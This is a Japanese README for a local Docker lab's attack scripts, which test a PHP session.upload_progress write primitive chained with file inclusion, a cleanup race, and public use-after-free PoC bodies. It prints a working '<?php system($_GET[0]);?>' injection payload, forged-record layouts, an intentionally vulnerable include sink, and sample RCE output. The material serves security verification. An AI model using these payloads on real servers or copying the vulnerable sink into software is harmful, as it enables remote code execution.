# attacker/ — 攻撃スクリプトの使い方と実装解説

このディレクトリは、`../compose.yaml` で立てる**自分専用のローカルラボ**に対して、
PHP の `session.upload_progress` 周りの挙動と、アプリ側 LFI を組み合わせた鎖を検証するための
スクリプト群です。

> **重要**
> - 送信先は `127.0.0.1` / ラボ内の Docker サービスだけです。外部ホストには送らないでください。
> - `lfi-demo/` は**意図的に脆弱な LFI アプリ**です。`127.0.0.1` バインドのラボ外に公開しないでください。
> - ここで再現しているのは「PHP コアの UAF」ではなく、**`session.upload_progress` の書き込み
>   primitive + アプリ側 LFI** の鎖です。コア UAF の公開 PoC は別途 `attack.py` で検証しますが、
>   本ラボでは再現していません（`../ANALYSIS.md`）。

---

## 1. ファイル一覧

| ファイル | 役割 |
| --- | --- |
| `attack.py` | probe / 258B trigger / 公開 PoC 618・619 の送信と証跡記録 |
| `public_pocs.py` | 公開バンドルの 618/619 ボディ、258B trigger の生成 |
| `lfi_demo.py` | `session.upload_progress` + LFI（cleanup=0、strict mode の追従） |
| `race_demo.py` | 既定 `cleanup=1` のレース（アップロード中に LFI） |
| `upload_include.py` | `enabled=0` でも残る multipart 一時ファイル include |
| `README.md` | このドキュメント |

関連:

- `../README.md` — ラボ全体の起動・結果
- `../ANALYSIS.md` — 公開 PoC のソース計測と、コア UAF が再現しない理由
- `../report/REPORT.md` / `../report/index.html` — 実行結果レポート
- `../report/evidence/` — 生の実行ログ・nginx/Apache access log・セッションファイル

---

## 2. ラボのターゲット

`../compose.yaml` の主なサービス:

| ポート | サービス | 設定 | 用途 |
| --- | --- | --- | --- |
| 8080 | `php-vuln` | `upload_progress=1`, `cleanup=0` | probe / trigger / 公開 PoC |
| 8081 | `php-mitigated` | `upload_progress=0` | 設定比較・一時ファイル経路 |
| 8083 | `php56` | PHP 5.6.40 | バージョン比較 |
| 8087 | `php-vuln` + LFI | `cleanup=0` | 基本の LFI 鎖 |
| 8088 | `php-cleanup` + LFI | `cleanup=1` | 既定設定のレース |
| 8089 | `php-mitigated` + LFI | `enabled=0` | 一時ファイル include |
| 8090 | `php-strict` + LFI | `use_strict_mode=1` | SID 固定の緩和検証 |
| 8091 | `php:8.4.4-apache` | mod_php | SAPI 比較（ワンオフ） |

起動:

```sh
cd ..                     # sandbox/
docker compose up -d --build
docker compose --profile cleanup --profile strict up -d php-cleanup php-strict
docker compose up -d --force-recreate nginx
```

`8091` の Apache は `report/run_repro.sh` がワンオフで起動します。
手動なら:

```sh
docker run -d --name php2shell-apache \
  -p 127.0.0.1:8091:80 \
  -v "$PWD/lfi-demo:/var/www/html:ro" \
  -v "$PWD/docker/php/php-on.ini:/usr/local/etc/php/conf.d/zz-php2shell.ini:ro" \
  php:8.4.4-apache
```

---

## 3. `attack.py` — 公開 PoC と trigger の検証

### 3.1 実行

```sh
cd ..
python3 attacker/attack.py --mode all
```

個別:

```sh
python3 attacker/attack.py --mode probe
python3 attacker/attack.py --mode trigger
python3 attacker/attack.py --mode poc618
python3 attacker/attack.py --mode poc619
```

### 3.2 probe（対照）

`PHP_SESSION_UPLOAD_PROGRESS=x` と小さなファイルを multipart で送り、次を確認します。

- `8080`（`upload_progress=1`）: `$_SESSION["upload_progress_x"]` が存在する。
- `8081`（`upload_progress=0`）: 進捗は存在しないが、`$_FILES` は解析される。

これは「設定で止まるのは session 側だけ」という対照です。

### 3.3 trigger（258B）

公開情報の 258 バイト body を、単発と `min_freq` を跨ぐ分割送信で送ります。

```text
[trigger-single] status=200 progress=present bytes_processed=258 file_bytes=1 done=True asan=no
[trigger-stall]  status=200 progress=present bytes_processed=258 file_bytes=1 done=True asan=no
```

`bytes_processed=258` と `files[0].bytes_processed=1` が、進捗ストア経路に到達した証拠です。
ASAN レポートは出ません（この trigger だけでは UAF にならない）。

### 3.4 poc618 / poc619

`public_pocs.py` が公開バンドルの 2 つのボディを生成し、`phase1` / `tail` に分けて送ります。

- `618`: 1 ファイル目 → 149 個の `t[]` → 2 ファイル目。`post_bytes_processed` の stale store を狙う構成。
- `619`: 149 個の `t[]` → 1 ファイル。`current_file_bytes_processed` の stale store を狙う構成。

判定:

- `--command`（既定 `id`）の出力 `uid=` がレスポンスに出るか。
- ASAN レポート（`--asan-dir`、既定 `data/logs`）が出るか。
- HTTP 5xx / 無応答でワーカーが落ちたか。

既定は `--call 0`（無害な 0）です。公開バンドルはビルド固有の
`zend_call_function` アドレスとアドレスリークを前提にしていますが、
このラボはリークを含みません。`--call` で明示できますが、RCE を保証するものではありません。

### 3.5 主なオプション

| オプション | 既定 | 説明 |
| --- | --- | --- |
| `--mode` | `all` | `probe` / `trigger` / `poc618` / `poc619` / `all` |
| `--target` | `http://127.0.0.1:8080/index.php` | 脆弱側 |
| `--mitigated` | `http://127.0.0.1:8081/index.php` | `enabled=0` 側 |
| `--command` | `id` | 偽造レコードに埋めるコマンド |
| `--rce-pattern` | `uid=` | RCE 判定文字列 |
| `--call` | `0` | 偽造レコードの call 先（16進） |
| `--stall` | `1.5` | 分割送信の待ち時間 |
| `--jsonl` | `data/evidence.jsonl` | 1 リクエスト 1 行の証跡 |
| `--save-raw` | off | `data/raw/` に生の request/response を保存 |
| `--asan-dir` | `data/logs` | ASAN / PHP / FPM ログ |
| `--allow-nonlocal` | off | ラボ外ホストを明示許可（通常は使わない） |

### 3.6 証跡の形式

`data/evidence.jsonl` の 1 行:

```json
{
  "seq": 5,
  "timestamp": "2026-10-21T17:49:17+0900",
  "mode": "poc618",
  "request": {
    "method": "POST",
    "url": "http://127.0.0.1:8080/index.php",
    "headers": {"Content-Type": "multipart/form-data; boundary=B7kQpoc618", "Cookie": "PHPSESSID=..."},
    "body_len": 62935,
    "body_sha256": "..."
  },
  "response": {
    "status": 200,
    "headers": {"content-type": "application/json"},
    "body_len": 467,
    "body_sha256": "...",
    "body_preview": "{\"php\":\"8.4.4\",...}",
    "timed_out": false,
    "error": null,
    "duration_ms": 1234
  },
  "observations": {
    "variant": "618",
    "rce_indicator": false,
    "asan_reports": [],
    "fatal_errors": []
  }
}
```

`--save-raw` を付けると、同じ seq の `*-req.bin` / `*-res.bin` が `data/raw/` に残ります。
`body_sha256` は「同じものを送った」ことの同一性証明に使えます。

### 3.7 このモードの結論

本ラボの 8.4.4 ASAN（`USE_ZEND_ALLOC=0`）では、618/619 は HTTP 200・`uid=` なし・
ASAN レポートなしでした。8.5.4 ASAN、5.6.40、ASLR 無効 + 実 call アドレス、
毒 call アドレスでも同様です。詳細な理由は `../ANALYSIS.md` を参照してください。

---

## 4. `lfi_demo.py` — `session.upload_progress` + LFI

### 4.1 攻撃の流れ

1. `PHPSESSID` を攻撃者が決める（`use_strict_mode=0` の既定）。
2. `PHP_SESSION_UPLOAD_PROGRESS` に PHP コードを入れる。
3. PHP がアプリ実行前に `sess_<PHPSESSID>` へシリアライズして書き込む。
4. LFI が `sess_<PHPSESSID>` を `include` する。
5. キー文字列内の `<?php ... ?>` が実行される。

### 4.2 送る multipart

```text
--boundary
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php system($_GET[0]);?>
--boundary
Content-Disposition: form-data; name="f"; filename="a.txt"
Content-Type: text/plain

X
--boundary--
```

`PHP_SESSION_UPLOAD_PROGRESS` は**ファイルより前**に置きます。
セッションキーは `upload_progress_<?php system($_GET[0]);?>` になります。

### 4.3 ソース上の対応

- `main/rfc1867.c` `MULTIPART_EVENT_FORMDATA` → `event_formdata.value`。
- `ext/session/session.c` `php_session_rfc1867_callback()` →
  `smart_str_appendl(&progress->key, *data->value, value_len)`。
- `php_session_rfc1867_update()` → `php_session_initialize()` /
  `zend_hash_update()` → `php_session_flush()` で `sess_<id>` に書き込み。
- `php_session_rfc1867_early_find_sid()` → Cookie/GET の `PHPSESSID`。
- LFI の `include` がセッションファイルを PHP として評価。

### 4.4 実行

```sh
python3 attacker/lfi_demo.py
```

出力例:

```text
[*] upload http://127.0.0.1:8087/index.php sid=lfi...
[*] payload=<?php system($_GET[0]);?>
[*] upload status=200 body=b''
[*] include /tmp/sess_lfi...
[*] lfi status=200 bytes=396
upload_progress_uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
[*] command output present: True
```

`8087` は `cleanup=0` なので、アップロード後に LFI を1回送るだけで成立します。

### 4.5 `cleanup=1` の場合はレース

`8088` は `cleanup=1`（既定）です。終了時に進捗が消えるため、
`race_demo.py` でアップロード中に LFI を叩きます。

### 4.6 strict mode

```sh
python3 attacker/lfi_demo.py --target http://127.0.0.1:8090/index.php
```

`use_strict_mode=1` では、攻撃者が指定した未知の SID は拒否されます。
この場合、`include(/tmp/sess_<指定SID>)` は失敗します。

ただし、アップロード応答の `Set-Cookie` には新しい SID が入ります。
応答を読める状況では、その SID を使って成立します。

```sh
python3 attacker/lfi_demo.py --target http://127.0.0.1:8090/index.php --follow-cookie
```

### 4.7 失敗時のチェック

- `include(...): Failed to open stream` → セッションファイルがない。
  - `cleanup=1` で終了後に LFI した。
  - セッション ID が strict mode で置き換わった。
  - `session.save_path` と LFI のパスが違う。
- `upload_progress` がない → `enabled=0` か、フィールド名が違う。
- `uid=` が出ない → ペイロードの PHP 構文（クォート等）を確認。

---

## 5. `race_demo.py` — 既定 `cleanup=1` のレース

### 5.1 なぜ最初に 6000B 送るのか

FPM/CLI の multipart パーサは `FILLUNIT=5120` のバッファを持ちます。
最初のチャンクが小さいと `fill_buffer()` が残りを待ち、`FILE_START` が発火しません。
その結果、セッションファイルが作られず、LFI が空振りします。

`race_demo.py` は次を送ります。

1. `PHP_SESSION_UPLOAD_PROGRESS` + ファイルヘッダ + **6000B のファイルデータ**。
2. 1.5 秒 stall（この間に LFI スレッドが `/tmp/sess_<id>` を叩く）。
3. 残りのファイルデータと closing boundary。

`cleanup=1` は `MULTIPART_EVENT_END` で消すだけなので、stall 中はファイルが残ります。

### 5.2 実行

```sh
docker compose --profile cleanup up -d php-cleanup
python3 attacker/race_demo.py --attempts 3
```

出力例:

```text
[*] attempt 1/3
[+] sid=race... hit: upload_progress_uid=33(www-data) ...
[*] attempt 2/3
[+] sid=race... hit: upload_progress_uid=33(www-data) ...
[*] attempt 3/3
[+] sid=race... hit: upload_progress_uid=33(www-data) ...
[*] wins=3/3
```

### 5.3 チューニング

| オプション | 既定 | 意味 |
| --- | --- | --- |
| `--stall` | `1.5` | アップロードを止める秒数。`min_freq` より長くする |
| `--attempts` | `5` | 試行回数 |
| `--target` | `http://127.0.0.1:8088/index.php` | `cleanup=1` の LFI |

`min_freq=1` なので 1.5 秒で十分です。環境が遅い場合は 2〜3 秒に伸ばします。

---

## 6. `upload_include.py` — `enabled=0` の一時ファイル経路

### 6.1 前提

`session.upload_progress.enabled=0` でも、multipart のファイルアップロードは続きます。
`$_FILES['f']['tmp_name']` は作られ、アプリがそれを `include` すると RCE になります。

`lfi-demo/temp.php` は、そのための意図的に脆弱なアプリです。

```php
<?php
if (isset($_FILES['f']) && is_uploaded_file($_FILES['f']['tmp_name'])) {
    include($_FILES['f']['tmp_name']);
}
```

### 6.2 実行

```sh
python3 attacker/upload_include.py
```

出力例:

```text
[*] target=http://127.0.0.1:8089/temp.php status=200 bytes=54
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[*] command output present: True
```

### 6.3 意味

`enabled=0` は「session への進捗書き込み」を止めますが、
「multipart のアップロード」と「一時ファイル」は止めません。
アプリ側に upload-include sink がある場合は、別途そちらを塞ぐ必要があります。

---

## 7. `public_pocs.py` — ボディ生成の詳細

`public_pocs.py` は公開バンドル
`https://github.com/Zer061/CVE-2026-109618`
の `poc0_109618.py` / `poc1_109619.py` を元にしたボディ生成器です。

- `build_trigger(sid)`: 258B の trigger。
- `build618(sid, cmd, call)`: 1 ファイル目 → 149 `t[]` → 2 ファイル目。
- `build619(sid, cmd, call)`: 149 `t[]` → 1 ファイル。

`forge(call, cmd)` は次のレイアウトの 288B レコードを作ります。

| offset | 内容 |
| --- | --- |
| 0 | `zend_fcall_info` size (64) |
| 8 | function/handler pointer (`call`) |
| 16 | `IS_STRING_EX` (0x106) |
| 48 | `param_count=1` |
| 64 | `zend_internal_function.type` |
| 64+88 | handler (`call`) |
| 160 | `IS_OBJECT_EX` (0x308) |
| 200 | `system\0<cmd>\0` |

`call=0` は無害な 0 です。実アドレスを入れるには、対象ビルドの
`zend_call_function` と `zval_ptr_dtor` の delta が必要です。
公開フレームワークの `--syms` で delta を抽出できますが、**ASLR 下では
ランタイムアドレスのリークが別途必要**です。本ラボはリークを含みません。

---

## 8. 証跡の読み方

### 8.1 `data/evidence.jsonl`

`attack.py` の全リクエストが 1 行 1 JSON で残ります。
`request.body_sha256` と `response.body_sha256` で同一性を確認できます。

### 8.2 `data/raw/`

`--save-raw` を付けたときの生 request/response。
マルチパートの実バイトを後から再送・解析できます。

### 8.3 `data/logs/`

ASAN / PHP / FPM のログ。`USE_ZEND_ALLOC=0` により、Zend ヒープの
UAF も ASAN が検出できるようにしています。

### 8.4 nginx / Apache access log

`../report/evidence/08_nginx_access.log` と `12_apache_access.log` に、
`POST /index.php` → `GET /index.php?file=/tmp/sess_...&0=id` の流れが残ります。

### 8.5 セッションファイル

`../report/evidence/09_session_files_vuln.txt` に、
`upload_progress_<?php system($_GET[0]);?>|a:5:{...}` の実体が残ります。

---

## 9. トラブルシューティング

| 症状 | 原因 / 対処 |
| --- | --- |
| `502 Bad Gateway` | profile のサービスが未起動。`docker compose --profile cleanup up -d php-cleanup` など |
| `include(...): Failed to open stream` | セッションファイルがない。`cleanup=1` の終了後、strict mode で SID が変わった、`save_path` 違い |
| `upload_progress` が出ない | `enabled=0`、フィールド名違い、`PHP_SESSION_UPLOAD_PROGRESS` がファイルより後 |
| レースが 0/N | 初回チャンクが 5120B 未満、stall が短い、LFI 先のポート違い |
| `uid=` が出ない | ペイロードの構文、`$_GET[0]` のパラメータ名、LFI のパス |
| 対象外ホストで拒否される | ローカルガード。`--allow-nonlocal` は自分が所有するホストだけに使う |
| ASAN が出ない | `USE_ZEND_ALLOC=0` か、ASAN ビルドか、`--asan-dir` の場所を確認 |

---

## 10. 拡張する

### 10.1 新しい検証モードを足す

`attack.py` の `main()` にモードを追加し、`Recorder.record()` で
リクエスト/レスポンス/観測を残します。`send_stream()` は
`phase1` / `phase2` と stall に対応しています。

### 10.2 新しい sink を足す

`lfi-demo/` に PHP アプリを追加し、`compose.yaml` の nginx server と
`php-*` のボリュームを追加します。**必ず `127.0.0.1` バインド**にしてください。

### 10.3 パッチ版と比較する

`compose.patched.yaml` の `PATCHED_VERSION` を公式修正版に変え、
`php-patched` を 8082 で起動します。`attack.py --target http://127.0.0.1:8082/index.php`
で同じ trigger / PoC を送り、差分を比較します。

### 10.4 PHP のバージョンを変える

`PHP_VERSION=8.5.4 docker compose up -d --build` のように build arg を変えます。
5.6 は `php56` プロファイル（`php:5.6.40-fpm`）を使います。

---

## 11. 安全境界（再掲）

- 送信先は自分が管理するローカルラボだけ。
- `lfi-demo/` は意図的に脆弱です。インターネットに公開しない。
- 外部の PHP サーバーに対して `attack.py` / `lfi_demo.py` を実行しない。
- 証跡を共有するときは、実ホスト名・実 SID・実パスを必要に応じて伏せる。
- 本ドキュメントの内容は防御・検証目的であり、無断の攻撃を意図しません。
